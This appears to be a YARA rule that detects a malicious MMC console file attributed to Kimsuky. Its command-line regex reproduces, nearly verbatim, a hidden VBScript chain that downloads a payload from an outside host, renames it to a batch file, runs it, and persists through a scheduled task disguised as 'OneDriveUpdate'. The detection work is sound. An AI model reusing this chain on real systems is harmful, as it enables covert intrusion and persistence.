rule Detect_Kimsuky_APT_Malware {
    meta:
        author = "daniyyell"
        date = "2024-09-02"
        description = "Detects Kimsuky APT malware delivery technique using a malicious MMC console file"
        yarahub_uuid = "54f53153-df2d-4a22-b631-42aa1f0ddbe1"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:RED"
        yarahub_reference_md5 = "acfa481a369f1e796756532822ee40b2"
        malpedia_family = "win.kimsuky"
        aka = "Kimsuky APTclear"


    strings:
        // XML start tag for MMC console file
        $xml_start = /<\?xml\s+version="1\.0"\?\>\<MMC_ConsoleFile\s+ConsoleVersion="3\.0"/

        // Binary storage patterns
        $binary_start = /<BinaryStorage>/
        $binary_end = /<\/BinaryStorage>/
        $binary_data1 = /<Binary>\s*AQAAABQAAAAAAAAAAwAAAP////8=\s*<\/Binary>/
        $binary_data2 = /<Binary>\s*<\/Binary>\s*<\/MMC_ConsoleFile>/ 

        // CommandLine containing suspicious command and script
        $command_line = /CommandLine\s+Directory=""\s+WindowState="Minimized"\s+Params="\/c\s+mode\s+\d+,\d+&start\s+explorer\s+"https:\/\/docs\.google\.com"\s+&echo\s+On\s+Error\s+Resume\s+Next:Set\s+ws\s*=\s*CreateObject\("WScript\.Shell"\):Set\s+fs\s*=\s*CreateObject\("Scripting\.FileSystemObject"\):Set\s+Post0\s*=\s*CreateObject\("msxml2\.xmlhttp"\):gpath\s*=\s*ws\.ExpandEnvironmentStrings\("%appdata%"\)\s*\+\s*"\\Microsoft\\sus\.gif"\s*:bpath\s*=\s*ws\.ExpandEnvironmentStrings\("%appdata%"\)\s*\+\s*"\\Microsoft\\sus\.bat"\s*:If\s+fs\.FileExists\(gpath\)\s*Then:\s*re\s*=\s*fs\.movefile\(gpath,\s*bpath\)\s*:re\s*=\s*ws\.run\(bpath,0,true\)\s*:fs\.deletefile\(bpath\)\s*:Else:\s*Post0\.open\s+"GET",\s*"https:\/\/files\.delivrto\.me\/wp-content\/plugins\/health-check\/pages\/gorgon1\/d\.php\?na=battmp",\s*False:\s*Post0\.setRequestHeader\s*"Content-Type",\s*"application\/x-www-form-urlencoded"\s*:Post0\.Send:\s*t0\s*=\s*Post0\.responseText:\s*Set\s+f\s*=\s*fs\.CreateTextFile\(gpath,True\)\s*:f\.Write\(t0\)\s*:f\.Close:\s*End\s*If:\s*&gt;"C:\\Users\\Public\\Pictures\\temp\.vbs"&schtasks\s+\/create\s+\/tn\s+OneDriveUpdate\s+\/tr\s+"wscript\.exe\s+\/b\s+"C:\\Users\\Public\\Pictures\\temp\.vbs""\s+\/sc\s+minute\s+\/mo\s+41\s+\/f/

        // Specific XML tag and content to improve detection accuracy
        $task_tag = /<Task\s+Type="CommandLine"\s+Command="cmd\.exe"/
        $task_description = /<String\s+Name="Description" ID="11"\/>/

    condition:
        any of ($xml_start, $binary_start, $binary_data1, $binary_data2, $binary_end, $command_line, $task_tag, $task_description)
}
